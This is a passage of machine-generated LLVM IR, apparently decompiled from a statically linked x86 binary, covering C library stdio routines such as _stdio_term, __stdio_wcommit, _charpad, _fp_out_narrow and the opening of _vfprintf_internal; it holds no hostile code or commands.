  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051b59 = inttoptr i32 %arg1 to i16*
  %v4_8051b59 = call i32 @memcpy(i16* %v3_8051b59, i32 ptrtoint (i32* @global_var_805a220.478 to i32), i32 24)
  ret i32 %v4_8051b59
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b62 = load i32, i32* @esi, align 4
  %v0_8051b63 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b63, i32* %stack_var_-8, align 4
  %v1_8051b6c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805c29c.476 to i32))
  store i32 %v1_8051b6c, i32* %eax.global-to-local, align 4
  %v1_8051b78 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  store i32 %v1_8051b78, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_8051bc222 = icmp eq i32 %storemerge21, 0
  %v1_8051bc424 = icmp eq i1 %v1_8051bc222, false
  br i1 %v1_8051bc424, label %dec_label_pc_8051b85.lr.ph, label %dec_label_pc_8051be2.preheader

dec_label_pc_8051b85.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051b85

dec_label_pc_8051b85:                             ; preds = %dec_label_pc_8051b85.lr.ph, %dec_label_pc_8051bac
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_8051b85.lr.ph ], [ %storemerge, %dec_label_pc_8051bac ]
  %v1_8051b88 = add i32 %storemerge25, 56
  store i32 %v1_8051b88, i32* @esi, align 4
  %v1_8051b8c = call i32 @__pthread_return_0(i32 %v1_8051b88)
  store i32 %v1_8051b8c, i32* %eax.global-to-local, align 4
  %v1_8051b94 = icmp eq i32 %v1_8051b8c, 0
  br i1 %v1_8051b94, label %dec_label_pc_8051bac, label %dec_label_pc_8051b98

dec_label_pc_8051b98:                             ; preds = %dec_label_pc_8051b85
  %v0_8051b98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b98 = add i32 %v0_8051b98, 8
  %v2_8051b98 = inttoptr i32 %v1_8051b98 to i32*
  %v3_8051b98 = load i32, i32* %v2_8051b98, align 4
  store i32 %v3_8051b98, i32* %eax.global-to-local, align 4
  %v1_8051b9b = inttoptr i32 %v0_8051b98 to i16*
  store i16 48, i16* %v1_8051b9b, align 2
  %v0_8051ba0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ba0 = add i32 %v1_8051ba0, 24
  %v3_8051ba0 = inttoptr i32 %v2_8051ba0 to i32*
  store i32 %v0_8051ba0, i32* %v3_8051ba0, align 4
  %v0_8051ba3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ba3 = add i32 %v1_8051ba3, 28
  %v3_8051ba3 = inttoptr i32 %v2_8051ba3 to i32*
  store i32 %v0_8051ba3, i32* %v3_8051ba3, align 4
  %v0_8051ba6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ba6 = add i32 %v1_8051ba6, 16
  %v3_8051ba6 = inttoptr i32 %v2_8051ba6 to i32*
  store i32 %v0_8051ba6, i32* %v3_8051ba6, align 4
  %v0_8051ba9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ba9 = add i32 %v1_8051ba9, 20
  %v3_8051ba9 = inttoptr i32 %v2_8051ba9 to i32*
  store i32 %v0_8051ba9, i32* %v3_8051ba9, align 4
  br label %dec_label_pc_8051bac

dec_label_pc_8051bac:                             ; preds = %dec_label_pc_8051b85, %dec_label_pc_8051b98
  %v0_8051baf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051baf = add i32 %v0_8051baf, 52
  %v2_8051baf = inttoptr i32 %v1_8051baf to i32*
  store i32 1, i32* %v2_8051baf, align 4
  %v0_8051bb6 = load i32, i32* @esi, align 4
  %v1_8051bb7 = call i32 @__stdio_init_mutex(i32 %v0_8051bb6)
  store i32 %v1_8051bb7, i32* %eax.global-to-local, align 4
  %v0_8051bbc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bbc = add i32 %v0_8051bbc, 32
  %v2_8051bbc = inttoptr i32 %v1_8051bbc to i32*
  %storemerge = load i32, i32* %v2_8051bbc, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8051bc2 = icmp eq i32 %storemerge, 0
  %v1_8051bc4 = icmp eq i1 %v1_8051bc2, false
  br i1 %v1_8051bc4, label %dec_label_pc_8051b85, label %dec_label_pc_8051bbf.dec_label_pc_8051be2.preheader_crit_edge

dec_label_pc_8051bbf.dec_label_pc_8051be2.preheader_crit_edge: ; preds = %dec_label_pc_8051bac
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 4
  br label %dec_label_pc_8051be2.preheader

dec_label_pc_8051be2.preheader:                   ; preds = %dec_label_pc_8051bbf.dec_label_pc_8051be2.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8051bbf.dec_label_pc_8051be2.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_8051be23 = icmp eq i32 %storemerge12, 0
  %v1_8051be410 = icmp eq i1 %v1_8051be23, false
  br i1 %v1_8051be410, label %dec_label_pc_8051bce.preheader, label %dec_label_pc_8051be6

dec_label_pc_8051bce.preheader:                   ; preds = %dec_label_pc_8051be2.preheader
  br label %dec_label_pc_8051bce

dec_label_pc_8051bce:                             ; preds = %dec_label_pc_8051bce.preheader, %dec_label_pc_8051bdf
  %v0_8051bd6 = phi i32 [ %storemerge1, %dec_label_pc_8051bdf ], [ %storemerge12, %dec_label_pc_8051bce.preheader ]
  %v1_8051bce = inttoptr i32 %v0_8051bd6 to i8*
  %v2_8051bce = load i8, i8* %v1_8051bce, align 1
  %v3_8051bce = and i8 %v2_8051bce, 64
  %v4_8051bce = icmp eq i8 %v3_8051bce, 0
  br i1 %v4_8051bce, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bd3

dec_label_pc_8051bd3:                             ; preds = %dec_label_pc_8051bce
  %v1_8051bd7 = call i32 @__stdio_wcommit(i32 %v0_8051bd6)
  store i32 %v1_8051bd7, i32* %eax.global-to-local, align 4
  %v0_8051bdf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051bdf

dec_label_pc_8051bdf:                             ; preds = %dec_label_pc_8051bce, %dec_label_pc_8051bd3
  %v0_8051bdf = phi i32 [ %v0_8051bd6, %dec_label_pc_8051bce ], [ %v0_8051bdf.pre, %dec_label_pc_8051bd3 ]
  %v1_8051bdf = add i32 %v0_8051bdf, 32
  %v2_8051bdf = inttoptr i32 %v1_8051bdf to i32*
  %storemerge1 = load i32, i32* %v2_8051bdf, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8051be2 = icmp eq i32 %storemerge1, 0
  %v1_8051be4 = icmp eq i1 %v1_8051be2, false
  br i1 %v1_8051be4, label %dec_label_pc_8051bce, label %dec_label_pc_8051be6

dec_label_pc_8051be6:                             ; preds = %dec_label_pc_8051bdf, %dec_label_pc_8051be2.preheader
  %v2_8051be6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051be6, i32* %eax.global-to-local, align 4
  %v2_8051be7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051be7, i32* @ebx, align 4
  store i32 %v0_8051b62, i32* @esi, align 4
  ret i32 %v2_8051be6

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_8051bdf, { 1, 0 }
  uselistorder label %dec_label_pc_8051bce, { 1, 0 }
  uselistorder label %dec_label_pc_8051bac, { 1, 0 }
  uselistorder label %dec_label_pc_8051b85, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8051bec = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051bf4 = add i32 %arg1, 8
  %v2_8051bf4 = inttoptr i32 %v1_8051bf4 to i32*
  %v3_8051bf4 = load i32, i32* %v2_8051bf4, align 4
  store i32 %v3_8051bf4, i32* %edx.global-to-local, align 4
  %v1_8051bf7 = add i32 %arg1, 16
  %v2_8051bf7 = inttoptr i32 %v1_8051bf7 to i32*
  %v3_8051bf7 = load i32, i32* %v2_8051bf7, align 4
  %v2_8051bfa = sub i32 %v3_8051bf7, %v3_8051bf4
  %v12_8051bfa = icmp eq i32 %v2_8051bfa, 0
  store i32 %v2_8051bfa, i32* %eax.global-to-local, align 4
  br i1 %v12_8051bfa, label %dec_label_pc_8051c0d, label %dec_label_pc_8051bfe

dec_label_pc_8051bfe:                             ; preds = %entry
  store i32 %v3_8051bf4, i32* %v2_8051bf7, align 4
  %v0_8051c01 = load i32, i32* @ecx, align 4
  %v0_8051c02 = load i32, i32* %eax.global-to-local, align 4
  %v0_8051c03 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051c04 = load i32, i32* @ebx, align 4
  %v4_8051c05 = inttoptr i32 %v0_8051c04 to i16*
  %v5_8051c05 = call i32 @__stdio_WRITE(i16* %v4_8051c05, i32 %v0_8051c03, i32 %v0_8051c02, i32 %v0_8051c01)
  store i32 %v5_8051c05, i32* %eax.global-to-local, align 4
  %v0_8051c0d.pre = load i32, i32* @ebx, align 4
  %v2_8051c13.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051c0d

dec_label_pc_8051c0d:                             ; preds = %entry, %dec_label_pc_8051bfe
  %v2_8051c13 = phi i32 [ %tmp11, %entry ], [ %v2_8051c13.pre, %dec_label_pc_8051bfe ]
  %v0_8051c0d = phi i32 [ %arg1, %entry ], [ %v0_8051c0d.pre, %dec_label_pc_8051bfe ]
  %v1_8051c0d = add i32 %v0_8051c0d, 16
  %v2_8051c0d = inttoptr i32 %v1_8051c0d to i32*
  %v3_8051c0d = load i32, i32* %v2_8051c0d, align 4
  store i32 %v3_8051c0d, i32* %eax.global-to-local, align 4
  %v2_8051c10 = add i32 %v0_8051c0d, 8
  %v3_8051c10 = inttoptr i32 %v2_8051c10 to i32*
  %v4_8051c10 = load i32, i32* %v3_8051c10, align 4
  %v5_8051c10 = sub i32 %v3_8051c0d, %v4_8051c10
  store i32 %v5_8051c10, i32* %eax.global-to-local, align 4
  store i32 %v2_8051c13, i32* @edx, align 4
  store i32 %v0_8051bec, i32* @ebx, align 4
  ret i32 %v5_8051c10

; uselistorder directives
  uselistorder i32 %v0_8051c0d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051c0d, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8051c18 = load i32, i32* @edi, align 4
  %v0_8051c19 = load i32, i32* @eax, align 4
  store i32 %v0_8051c19, i32* @edi, align 4
  %v0_8051c1b = load i32, i32* @esi, align 4
  %v0_8051c1c = load i32, i32* @ecx, align 4
  store i32 %v0_8051c1c, i32* @esi, align 4
  %v0_8051c1e = load i32, i32* @ebx, align 4
  store i32 %v0_8051c1c, i32* @ebx, align 4
  %v0_8051c24 = load i32, i32* @edx, align 4
  store i32 %v0_8051c24, i32* %stack_var_-13, align 4
  %v1_8051c2b2 = icmp eq i32 %v0_8051c1c, 0
  br i1 %v1_8051c2b2, label %dec_label_pc_8051c43, label %dec_label_pc_8051c2f.lr.ph

dec_label_pc_8051c2f.lr.ph:                       ; preds = %entry
  %v2_8051c2f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8051c2f

dec_label_pc_8051c2a:                             ; preds = %dec_label_pc_8051c2f
  %v1_8051c2a = add i32 %v0_8051c2a, -1
  %v8_8051c2a = icmp eq i32 %v1_8051c2a, 0
  store i32 %v1_8051c2a, i32* @ebx, align 4
  br i1 %v8_8051c2a, label %dec_label_pc_8051c43.loopexit, label %dec_label_pc_8051c2a.dec_label_pc_8051c2f_crit_edge

dec_label_pc_8051c2a.dec_label_pc_8051c2f_crit_edge: ; preds = %dec_label_pc_8051c2a
  %v0_8051c33.pre = load i32, i32* @edx, align 4
  %v0_8051c34.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c2f

dec_label_pc_8051c2f:                             ; preds = %dec_label_pc_8051c2a.dec_label_pc_8051c2f_crit_edge, %dec_label_pc_8051c2f.lr.ph
  %v0_8051c34 = phi i32 [ %v0_8051c34.pre, %dec_label_pc_8051c2a.dec_label_pc_8051c2f_crit_edge ], [ %v0_8051c19, %dec_label_pc_8051c2f.lr.ph ]
  %v0_8051c33 = phi i32 [ %v0_8051c33.pre, %dec_label_pc_8051c2a.dec_label_pc_8051c2f_crit_edge ], [ %v0_8051c24, %dec_label_pc_8051c2f.lr.ph ]
  %v4_8051c38 = call i32 @__stdio_fwrite(i32 %v2_8051c2f, i32 1, i32 %v0_8051c34, i32 %v0_8051c33)
  %v8_8051c40 = icmp eq i32 %v4_8051c38, 1
  %v0_8051c2a = load i32, i32* @ebx, align 4
  br i1 %v8_8051c40, label %dec_label_pc_8051c2a, label %dec_label_pc_8051c43.loopexit

dec_label_pc_8051c43.loopexit:                    ; preds = %dec_label_pc_8051c2a, %dec_label_pc_8051c2f
  %v1_8051c46.ph = phi i32 [ %v0_8051c2a, %dec_label_pc_8051c2f ], [ 0, %dec_label_pc_8051c2a ]
  %v0_8051c46.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c43

dec_label_pc_8051c43:                             ; preds = %dec_label_pc_8051c43.loopexit, %entry
  %v0_8051c46 = phi i32 [ 0, %entry ], [ %v0_8051c46.pre, %dec_label_pc_8051c43.loopexit ]
  %v1_8051c46 = phi i32 [ 0, %entry ], [ %v1_8051c46.ph, %dec_label_pc_8051c43.loopexit ]
  %v2_8051c46 = sub i32 %v0_8051c46, %v1_8051c46
  store i32 %v0_8051c1e, i32* @ebx, align 4
  store i32 %v0_8051c1b, i32* @esi, align 4
  store i32 %v0_8051c18, i32* @edi, align 4
  ret i32 %v2_8051c46

; uselistorder directives
  uselistorder i32 %v1_8051c2a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8051c43.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8051c61 = trunc i32 %arg2 to i8
  %v5_8051c61 = icmp slt i8 %v3_8051c61, 0
  %v1_8051c63 = icmp eq i1 %v5_8051c61, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8051c63, label %dec_label_pc_8051c94, label %dec_label_pc_8051c65

dec_label_pc_8051c65:                             ; preds = %entry
  %v3_8051c6c = call i32 @strlen(i8* %arg4)
  %v0_8051c74 = load i32, i32* @ebx, align 4
  %v2_8051c74 = sub i32 %v0_8051c74, %v3_8051c6c
  store i32 %v2_8051c74, i32* @ebx, align 4
  store i32 %v3_8051c6c, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8051c74, 1
  br i1 %tmp23, label %dec_label_pc_8051c92, label %dec_label_pc_8051c7c

dec_label_pc_8051c7c:                             ; preds = %dec_label_pc_8051c65
  store i32 %arg1, i32* @eax, align 4
  %v0_8051c80 = load i32, i32* @edi, align 4
  %v1_8051c80 = urem i32 %v0_8051c80, 128
  store i32 %v1_8051c80, i32* @edi, align 4
  store i32 %v2_8051c74, i32* @ecx, align 4
  store i32 %v1_8051c80, i32* @edx, align 4
  %v0_8051c87 = call i32 @_charpad()
  %v12_8051c8c = icmp eq i32 %v0_8051c87, %v2_8051c74
  store i32 %v0_8051c87, i32* @ebp, align 4
  %v1_8051c90 = icmp eq i1 %v12_8051c8c, false
  br i1 %v1_8051c90, label %dec_label_pc_8051cae, label %dec_label_pc_8051c7c.dec_label_pc_8051c92_crit_edge

dec_label_pc_8051c7c.dec_label_pc_8051c92_crit_edge: ; preds = %dec_label_pc_8051c7c
  %v0_8051c92.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c92

dec_label_pc_8051c92:                             ; preds = %dec_label_pc_8051c7c.dec_label_pc_8051c92_crit_edge, %dec_label_pc_8051c65
  %v0_8051c92 = phi i32 [ %v0_8051c92.pre, %dec_label_pc_8051c7c.dec_label_pc_8051c92_crit_edge ], [ %v3_8051c6c, %dec_label_pc_8051c65 ]
  store i32 %v0_8051c92, i32* @ebx, align 4
  br label %dec_label_pc_8051c94

dec_label_pc_8051c94:                             ; preds = %entry, %dec_label_pc_8051c92
  %v0_8051c9f = phi i32 [ %arg3, %entry ], [ %v0_8051c92, %dec_label_pc_8051c92 ]
  %tmp24 = icmp slt i32 %v0_8051c9f, 1
  br i1 %tmp24, label %dec_label_pc_8051cac, label %dec_label_pc_8051c9a

dec_label_pc_8051c9a:                             ; preds = %dec_label_pc_8051c94
  %v0_8051c9a = load i32, i32* @ecx, align 4
  %v5_8051ca4 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8051c9f, i32 %arg1, i32 %v0_8051c9a)
  br label %dec_label_pc_8051cac

dec_label_pc_8051cac:                             ; preds = %dec_label_pc_8051c94, %dec_label_pc_8051c9a
  %v1_8051cac = phi i32 [ 0, %dec_label_pc_8051c94 ], [ %v5_8051ca4, %dec_label_pc_8051c9a ]
  %v0_8051cac = load i32, i32* @ebp, align 4
  %v2_8051cac = add i32 %v0_8051cac, %v1_8051cac
  br label %dec_label_pc_8051cae

dec_label_pc_8051cae:                             ; preds = %dec_label_pc_8051c7c, %dec_label_pc_8051cac
  %v0_8051cb1 = phi i32 [ %v0_8051c87, %dec_label_pc_8051c7c ], [ %v2_8051cac, %dec_label_pc_8051cac ]
  ret i32 %v0_8051cb1

; uselistorder directives
  uselistorder i32 %v0_8051c9f, { 1, 0 }
  uselistorder i32 %v0_8051c87, { 1, 2, 0 }
  uselistorder i32 %v1_8051c80, { 1, 0 }
  uselistorder i32 %v2_8051c74, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051cae, { 1, 0 }
  uselistorder label %dec_label_pc_8051cac, { 1, 0 }
  uselistorder label %dec_label_pc_8051c94, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051cbb = load i32, i32* @ebx, align 4
  store i32 %v0_8051cbb, i32* %stack_var_-16, align 4
  %v4_8051cbb = ptrtoint i32* %stack_var_-16 to i32
  %v1_8051cbc = add i32 %v4_8051cbb, -356
  %v10_8051cbc = icmp slt i32 %v1_8051cbc, 0
  store i1 %v10_8051cbc, i1* %sf.global-to-local, align 1
  %v4_8051cc2 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051cc2, i32* @ebx, align 4
  %v2_8051cca = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8051cca, i32* @esi, align 4
  %v5_8051ccf = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8051cc2)
  store i32 %v5_8051ccf, i32* %eax.global-to-local, align 4
  %v2_8051cd7 = icmp slt i32 %v5_8051ccf, 0
  store i1 %v2_8051cd7, i1* %sf.global-to-local, align 1
  %v1_8051cd9 = icmp eq i1 %v2_8051cd7, false
  br i1 %v1_8051cd9, label %dec_label_pc_8051d19, label %dec_label_pc_8051cdb

dec_label_pc_8051cdb:                             ; preds = %entry
  %v12_8051cd4 = ptrtoint i32* %stack_var_-364 to i32
  %v3_8051cdb = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8051cdb, i32* @ebx, align 4
  %v1_8051cdf = add i32 %v12_8051cd4, -12
  %v10_8051cdf = icmp slt i32 %v1_8051cdf, 0
  store i1 %v10_8051cdf, i1* %sf.global-to-local, align 1
  %v5_8051ce2 = inttoptr i32 %v3_8051cdb to i8*
  %v3_8051ce3 = call i32 @strlen(i8* %v5_8051ce2)
  store i32 %v3_8051ce3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_8051cf2 = icmp eq i32 %v3_8051ce3, 0
  %v2_8051cf2 = icmp slt i32 %v3_8051ce3, 0
  store i1 %v2_8051cf2, i1* %sf.global-to-local, align 1
  br i1 %v1_8051cf2, label %dec_label_pc_8052262, label %dec_label_pc_8051cfa

dec_label_pc_8051cfa:                             ; preds = %dec_label_pc_8051cdb
  %v0_8051cfa = load i32, i32* @edx, align 4
  %v0_8051d03 = load i32, i32* @ebx, align 4
  %v6_8051d04 = call i32 @__stdio_fwrite(i32 %v0_8051d03, i32 %v3_8051ce3, i32 %arg1, i32 %v0_8051cfa)
  store i32 %v6_8051d04, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8051d11 = load i32, i32* @esp, align 4
  %v1_8051d11 = add i32 %v0_8051d11, 16
  %v7_8051d11 = icmp slt i32 %v1_8051d11, 0
  store i1 %v7_8051d11, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052262

dec_label_pc_8051d19:                             ; preds = %entry
  %v6_8051d23 = call i32 @_ppfs_prepargs(i32 %v2_8051cca, i32 %arg3, i32 %v5_8051ccf, i32 %v5_8051ccf)
  store i32 %v6_8051d23, i32* %eax.global-to-local, align 4
  %v0_8051d28 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d28, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8051d32 = load i32, i32* @esp, align 4
  %v1_8051d32 = add i32 %v0_8051d32, 16
  %v7_8051d32 = icmp slt i32 %v1_8051d32, 0
  store i1 %v7_8051d32, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051d38

dec_label_pc_8051d37:                             ; preds = %dec_label_pc_8051d3e
  %v1_8051d37 = add i32 %v0_8051d46, 1
  %v9_8051d37 = icmp slt i32 %v1_8051d37, 0
  store i1 %v9_8051d37, i1* %sf.global-to-local, align 1
  store i32 %v1_8051d37, i32* @ebx, align 4
  br label %dec_label_pc_8051d38.backedge

dec_label_pc_8051d38.backedge:                    ; preds = %dec_label_pc_8051d37, %dec_label_pc_8052248, %dec_label_pc_8052253
  %v1_8051d4220 = phi i32 [ %v1_8051d4a, %dec_label_pc_8051d37 ], [ %v3_8052248, %dec_label_pc_8052248 ], [ %v1_8051d76, %dec_label_pc_8052253 ]
  %v0_8051d3818 = phi i32 [ %v1_8051d37, %dec_label_pc_8051d37 ], [ %v3_8052248, %dec_label_pc_8052248 ], [ %v1_8052253, %dec_label_pc_8052253 ]
  %v4_8051d38.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %dec_label_pc_8051d38.backedge, %dec_label_pc_8051d19
  %v1_8051d4a = phi i32 [ %v1_8051d4220, %dec_label_pc_8051d38.backedge ], [ %v0_8051d28, %dec_label_pc_8051d19 ]
  %v0_8051d46 = phi i32 [ %v0_8051d3818, %dec_label_pc_8051d38.backedge ], [ %v0_8051d28, %dec_label_pc_8051d19 ]
  %v4_8051d38 = phi i32 [ %v4_8051d38.pre, %dec_label_pc_8051d38.backedge ], [ %v6_8051d23, %dec_label_pc_8051d19 ]
  %v1_8051d38 = inttoptr i32 %v0_8051d46 to i8*
  %v2_8051d38 = load i8, i8* %v1_8051d38, align 1
  %v3_8051d38 = zext i8 %v2_8051d38 to i32
  %v5_8051d38 = and i32 %v4_8051d38, -256
  %v6_8051d38 = or i32 %v3_8051d38, %v5_8051d38
  store i32 %v6_8051d38, i32* %eax.global-to-local, align 4
  %v4_8051d3a = icmp eq i8 %v2_8051d38, 0
  %v5_8051d3a = icmp slt i8 %v2_8051d38, 0
  store i1 %v5_8051d3a, i1* %sf.global-to-local, align 1
  br i1 %v4_8051d3a, label %dec_label_pc_8051d42, label %dec_label_pc_8051d3e

dec_label_pc_8051d3e:                             ; preds = %dec_label_pc_8051d38
  %v2_8051d3e = add i8 %v2_8051d38, -37
  %v10_8051d3e = icmp eq i8 %v2_8051d3e, 0
  %v11_8051d3e = icmp slt i8 %v2_8051d3e, 0
  store i1 %v11_8051d3e, i1* %sf.global-to-local, align 1
  %v1_8051d40 = icmp eq i1 %v10_8051d3e, false
  br i1 %v1_8051d40, label %dec_label_pc_8051d37, label %dec_label_pc_8051d42

dec_label_pc_8051d42:                             ; preds = %dec_label_pc_8051d3e, %dec_label_pc_8051d38
  %v2_8051d42 = sub i32 %v0_8051d46, %v1_8051d4a
  %v12_8051d42 = icmp eq i32 %v2_8051d42, 0
  %v13_8051d42 = icmp slt i32 %v2_8051d42, 0
  store i1 %v13_8051d42, i1* %sf.global-to-local, align 1
  br i1 %v12_8051d42, label %dec_label_pc_8051d6d, label %dec_label_pc_8051d46

dec_label_pc_8051d46:                             ; preds = %dec_label_pc_8051d42
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051d42, i32* @esi, align 4
  store i1 %v13_8051d42, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_8051d42, 1
  br i1 %tmp65, label %dec_label_pc_8051d62, label %dec_label_pc_8051d50

dec_label_pc_8051d50:                             ; preds = %dec_label_pc_8051d46
  %v0_8051d50 = load i32, i32* @ebp, align 4
  %v1_8051d50 = load i32, i32* @esp, align 4
  %v2_8051d50 = add i32 %v1_8051d50, -4
  %v3_8051d50 = inttoptr i32 %v2_8051d50 to i32*
  store i32 %v0_8051d50, i32* %v3_8051d50, align 4
  %v1_8051d51 = add i32 %v1_8051d50, 368
  %v2_8051d51 = inttoptr i32 %v1_8051d51 to i32*
  %v3_8051d51 = load i32, i32* %v2_8051d51, align 4
  %v5_8051d51 = add i32 %v1_8051d50, -8
  %v6_8051d51 = inttoptr i32 %v5_8051d51 to i32*
  store i32 %v3_8051d51, i32* %v6_8051d51, align 4
  %v0_8051d58 = load i32, i32* @esi, align 4
  %v2_8051d58 = add i32 %v1_8051d50, -12
  %v3_8051d58 = inttoptr i32 %v2_8051d58 to i32*
  store i32 %v0_8051d58, i32* %v3_8051d58, align 4
  %v0_8051d59 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051d59 = add i32 %v1_8051d50, -16
  %v3_8051d59 = inttoptr i32 %v2_8051d59 to i32*
  store i32 %v0_8051d59, i32* %v3_8051d59, align 4
  %v0_8051d5a = load i32, i32* %stack_var_-364, align 4
  %v4_8051d5a = call i32 @__stdio_fwrite(i32 %v0_8051d5a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051d5a, i32* %eax.global-to-local, align 4
  %v0_8051d5f = load i32, i32* @esp, align 4
  %v1_8051d5f = add i32 %v0_8051d5f, 16
  %v7_8051d5f = icmp slt i32 %v1_8051d5f, 0
  store i1 %v7_8051d5f, i1* %sf.global-to-local, align 1
  %v1_8051d62.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051d62

dec_label_pc_8051d62:                             ; preds = %dec_label_pc_8051d46, %dec_label_pc_8051d50
  %v3_8051d6a = phi i32 [ %v2_8051d42, %dec_label_pc_8051d46 ], [ %v1_8051d62.pre, %dec_label_pc_8051d50 ]
  %v0_8051d62 = phi i32 [ 0, %dec_label_pc_8051d46 ], [ %v4_8051d5a, %dec_label_pc_8051d50 ]
  %v2_8051d62 = sub i32 %v0_8051d62, %v3_8051d6a
  %v12_8051d62 = icmp eq i32 %v2_8051d62, 0
  %v13_8051d62 = icmp slt i32 %v2_8051d62, 0
  store i1 %v13_8051d62, i1* %sf.global-to-local, align 1
  %v1_8051d64 = icmp eq i1 %v12_8051d62, false
  %v0_805225b.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8051d64, label %dec_label_pc_805225b, label %dec_label_pc_8051d6a

dec_label_pc_8051d6a:                             ; preds = %dec_label_pc_8051d62
  %v1_8051d6a = inttoptr i32 %v0_805225b.pre.pre to i32*
  %v2_8051d6a = load i32, i32* %v1_8051d6a, align 4
  %v4_8051d6a = add i32 %v2_8051d6a, %v3_8051d6a
  %v15_8051d6a = icmp slt i32 %v4_8051d6a, 0
  store i1 %v15_8051d6a, i1* %sf.global-to-local, align 1
